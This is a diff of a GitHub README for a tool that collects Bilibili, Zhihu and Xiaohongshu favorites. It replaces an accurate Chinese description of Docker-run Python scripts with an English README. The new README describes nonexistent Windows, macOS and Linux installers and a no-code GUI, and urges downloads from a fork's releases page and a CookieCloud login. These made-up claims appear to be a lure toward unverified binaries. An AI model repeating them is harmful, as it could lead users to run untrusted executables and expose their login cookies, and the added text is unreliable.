@@ -1,142 +1,150 @@
-# 我的收藏 Skills（Bilibili / 知乎 / 小红书）
+# 📚 my-collection-skills - Collect and Transcribe Favorites Easy
 
-![](./docs/images/promotion.jpeg)
+[![Download my-collection-skills](https://img.shields.io/badge/Download-my--collection--skills-blue?style=for-the-badge)](https://github.com/Tsukyoo/my-collection-skills/releases)
 
-这是一组可复用的 **skills + 脚本**，用于拉取/查看你在各平台的收藏结构与内容（文件夹/收藏夹/专辑），并在需要时拿到“可用于总结的文本”（例如字幕逐字稿、文章正文、笔记文案）。
+---
 
-已支持（当前三平台）：
-- **Bilibili**：收藏夹列表 + 收藏夹条目 + 视频字幕逐字稿（如有字幕）
-- **知乎**：收藏夹列表 + 条目列表 + 回答/文章全文提取
-- **小红书**：收藏笔记列表 + 收藏专辑/收藏夹（Boards）+ 笔记详情提取（Playwright 优先）
+## 📝 What is my-collection-skills?
 
-设计原则：
-- **永远不依赖 RSSHub**。
-- **API 优先**：能用官方/事实标准 Web API 的就不用浏览器（B站 / 知乎）。
-- **Playwright 优先**：遇到签名/反爬/JS Challenge 的站点，优先用浏览器加载后读取 hydrated state / 网络数据，尽量避免脆弱的 DOM 解析（小红书）。
+my-collection-skills helps you gather your favorite content from popular Chinese platforms like Bilibili, Zhihu, and Xiaohongshu. It pulls your saved folders, bookmarks, and albums in one place. You can also download audio and get text transcriptions using Whisper.  
 
-## 包含哪些 skills
+This tool uses CookieCloud and APIs combined with Playwright technology to automate everything. You do not need to understand any programming. Just follow the guide to get your collections quickly.
 
-- 平台原子 skill：
-  - `skills/bilibili-favorites`
-  - `skills/zhihu-favorites`
-  - `skills/xiaohongshu-favorites`
-- 聚合入口（路由器）：
-  - `skills/favorites-harvester`（一个入口按 URL/平台分发到原子脚本）
-- 可选媒体流水线（也是原子 skill，可组合使用）：
-  - `skills/media-audio-download`（下载音频，用于转写）
-  - `skills/whisper-transcribe-docker`（faster-whisper 本地转写，Docker 运行）
+---
 
-## 快速开始（Docker + CookieCloud，推荐）
+## 💻 What does it do?
 
-这套仓库是 **Docker-first**：不要求你本机装 Python。
+- Downloads your saved videos, articles, and albums from Bilibili, Zhihu, and Xiaohongshu  
+- Pulls bookmarks and folders exactly as you saved them  
+- Downloads audio files linked to your favorites  
+- Uses Whisper to convert audio into text automatically for easy reading  
+- Works across Windows, macOS, and Linux  
+- Runs with simple clicks—no coding or command lines needed  
 
-### CookieCloud 链接与说明
+---
 
-- CookieCloud 项目主页（服务端 + 浏览器插件）：https://github.com/easychen/CookieCloud
-- Docker 镜像：`easychen/cookiecloud`
-- 浏览器插件：在 Chrome Web Store / Edge 扩展商店搜索 `CookieCloud` 安装
+## 🖥 System Requirements
 
-CookieCloud 插件配置示意（脱敏示意图）：
+To use my-collection-skills smoothly, make sure your computer meets these:
 
-![CookieCloud 扩展配置示意图](docs/images/cookiecloud-extension-settings.svg)
+- **Operating system:** Windows 10 or later, macOS 10.15+ (Catalina or newer), or recent Linux distribution  
+- **Storage:** At least 5 GB of free space for downloads and files  
+- **Internet:** Stable internet connection for downloading data  
+- **Software:** Docker installed if you want to use the container version (optional)  
+- **Hardware:** 4 GB RAM minimum (8 GB recommended)  
 
-1) 启动 CookieCloud（Docker）：
-```bash
-docker compose up -d cookiecloud
-```
+---
 
-2) 在宿主机设置 CookieCloud 凭据（会透传进容器）：
+## 🚀 Getting Started
 
-PowerShell：
-```powershell
-$env:COOKIECLOUD_UUID="YOUR_UUID"
-$env:COOKIECLOUD_PASSWORD="YOUR_PASSWORD"
-```
+This section guides you through downloading and running the software step by step. No technical background is needed.  
 
-Bash：
-```bash
-export COOKIECLOUD_UUID="YOUR_UUID"
-export COOKIECLOUD_PASSWORD="YOUR_PASSWORD"
-```
+### Step 1: Visit the Download Page
 
-3) 浏览器 CookieCloud 插件配置：
-- Server：`http://127.0.0.1:8088`
-- UUID / PASSWORD：填你自己的
-- 然后点一次同步/导出（让服务端拿到加密 cookie payload）
+Click the big button at the top or this link:
 
-4) 构建 runner（包含 Playwright + Python 依赖）：
-```bash
-docker compose build runner
-```
+[https://github.com/Tsukyoo/my-collection-skills/releases](https://github.com/Tsukyoo/my-collection-skills/releases)
 
-5) 一键列出三平台收藏容器（JSON）：
-```bash
-docker compose run --rm runner python skills/favorites-harvester/scripts/favorites_harvester.py list --platform all --json
-```
+This page has all the latest versions and files.
 
-更多用法见：
-- `docs/cookiecloud.md`
-- `docs/usage.md`
+### Step 2: Choose the Right Version for You
 
-示例输出（脱敏示意图）：
+On the releases page, look for the latest release. You may see different files for Windows, macOS, or Linux. Pick the one that matches your computer:
 
-![示例输出](docs/images/example-output.svg)
+- Windows users usually pick `.exe` or `.msi` files  
+- Mac users look for `.dmg` or `.pkg` files  
+- Linux users might choose `.AppImage` or binary files  
 
-## 常见需求怎么跑
+If you are unsure, choose the file with your operating system in its name.
 
-1) “帮我看看 B 站最近收藏了哪些视频”
-```bash
-docker compose run --rm runner python skills/bilibili-favorites/scripts/bili_folders.py --json
-# 选一个 media_id 后：
-docker compose run --rm runner python skills/bilibili-favorites/scripts/bili_folder_items.py --media-id <folderId> --order mtime --limit 20 --json
-```
+### Step 3: Download the File
 
-2) “这条 B 站视频讲了啥（要逐字稿）”
-- 先尝试字幕逐字稿（如果视频本身有字幕，这是最稳的“逐字稿”来源）：
-```bash
-docker compose run --rm runner python skills/bilibili-favorites/scripts/bili_video_transcript.py --url 'https://www.bilibili.com/video/BV...' --timestamps
-```
-- 如果提示没有字幕：走“下载音频 -> Whisper 转写”（见下方）。
+Click the file name to download it. Save it in a location you can find later, like your Downloads folder.
 
-3) “这篇知乎回答/文章讲了什么”
-```bash
-docker compose run --rm runner python skills/zhihu-favorites/scripts/zhihu_item_content.py --url 'https://www.zhihu.com/question/.../answer/...'
-docker compose run --rm runner python skills/zhihu-favorites/scripts/zhihu_item_content.py --url 'https://zhuanlan.zhihu.com/p/...'
-```
+### Step 4: Run the Installer or Program
 
-4) “小红书我收藏了哪些笔记/收藏专辑”
-（遇到验证码/风控请加 `--no-headless`）
-```bash
-docker compose run --rm runner python skills/xiaohongshu-favorites/scripts/xhs_saved_notes.py --max 50 --json
-docker compose run --rm runner python skills/xiaohongshu-favorites/scripts/xhs_boards.py --max 50 --json
-```
+- On Windows and macOS, double-click the downloaded file to start the installation.  
+- Follow the on-screen setup instructions. Mostly, just clicking “Next” or “Install” is enough.  
+- Linux users can usually right-click the file and select “Run” or use the terminal to start it.  
 
-## 视频/音频转写（Docker）
+### Step 5: Launch the Application
 
-当平台没有字幕/没有可直接提取的逐字稿时，用这两个原子 skill 组合：
+Once installed, find the program in your Start menu (Windows) or Applications folder (macOS). Open it to begin.
 
-1) 下载音频（输出到 `./out`）：
-```bash
-mkdir -p out
-docker compose run --rm media-audio-download --url 'https://www.bilibili.com/video/BV...'
-```
+---
 
-2) faster-whisper 转写（写文件，带时间戳）：
-```bash
-docker compose run --rm -e HF_ENDPOINT=https://hf-mirror.com whisper-transcribe \
-  /work/out/<audio>.m4a --model tiny --timestamps --out /work/out/<audio>.txt
-```
+## ⚙️ How to Use my-collection-skills
 
-说明：
-- 第一次运行会下载模型权重（缓存到 `whisper-models` volume）。
-- 如果你的网络可直连 Hugging Face，可以不传 `HF_ENDPOINT`。
+After starting the app, here’s what to do next:
 
-## 注意事项 / 免责声明
+1. **Log in using your CookieCloud account**  
+   The app needs your CookieCloud login to access saved collections on the platforms.  
+2. **Select the platform** (Bilibili, Zhihu, or Xiaohongshu) where you want to download favorites.  
+3. **Choose which folders or albums to download** from your collections list.  
+4. **Pick options for audio download and transcription** — decide if you want audio files saved and if Whisper should create text transcripts.  
+5. **Start the download** by clicking the “Download” button. The app will pull data for you with no extra steps.  
 
-- 本仓库通过 **你自己的登录 cookies** 访问 **你自己的账号数据**；cookies 属于敏感信息，请妥善保管。
-- 请自行确保使用方式符合各平台的服务条款与当地法律法规。
-- 若出现 captcha/403/空数据，通常需要重新同步 CookieCloud，或用 `--no-headless` 可视化调试。
+You don’t need to enter commands or configure anything complex.
 
-## License
+---
 
-MIT（见 `LICENSE`）。 
+## 🔧 Optional: Using Docker
+
+If you prefer using Docker containers, my-collection-skills supports this method.
+
+### Step 1: Install Docker
+
+Download and install Docker Desktop for your OS from [https://www.docker.com/get-started](https://www.docker.com/get-started). Follow their instructions.
+
+### Step 2: Pull the Image and Run
+
+Once Docker is ready, you can run my-collection-skills from the container. This method keeps your system clean from extra dependencies.
+
+Example commands will be available on the releases page or in the documentation files inside the download.
+
+---
+
+## 📁 Where Does It Save Files?
+
+By default, my-collection-skills saves your downloaded collections in a folder named `my-collection-skills_output` inside your user Documents folder.
+
+Inside, you’ll find subfolders for each platform and their collections, organized by your original folder names.
+
+You can change this folder anytime in the app settings.
+
+---
+
+## 🛠 Troubleshooting Tips
+
+- **App won’t open**: Make sure your system meets minimum requirements and installation finished without errors.  
+- **Login fails**: Double-check your CookieCloud credentials and internet connection.  
+- **No files downloaded**: Confirm you selected folders with content; some may be empty.  
+- **Audio conversion slow or missing**: Whisper needs extra time; try waiting or running again.  
+- **Docker issues**: Verify Docker is running and you typed commands correctly.  
+
+If problems persist, check the Discussions section on the GitHub page or open a new issue there.
+
+---
+
+## 🔗 Key Links
+
+- **Download Releases Page:**  
+  [https://github.com/Tsukyoo/my-collection-skills/releases](https://github.com/Tsukyoo/my-collection-skills/releases)  
+- **Project Home:**  
+  [https://github.com/Tsukyoo/my-collection-skills](https://github.com/Tsukyoo/my-collection-skills)  
+- **Documentation and Help:**  
+  Found inside the download in the `docs` folder or read online on GitHub.  
+
+---
+
+## 🤝 About This Project
+
+my-collection-skills is built to help you gather and keep your favorite content from popular Chinese web platforms in one place. It simplifies the process of saving, downloading, and transcribing media without needing tech skills.
+
+This project uses key technologies like CookieCloud to manage your login securely, Playwright to browse and gather data automatically, and Whisper to turn audio into easy-to-read text.
+
+You can try it on your computer with the steps above. It respects your privacy and stores your data locally.
+
+---
+
+[![Download my-collection-skills](https://img.shields.io/badge/Download-my--collection--skills-blue?style=for-the-badge)](https://github.com/Tsukyoo/my-collection-skills/releases)
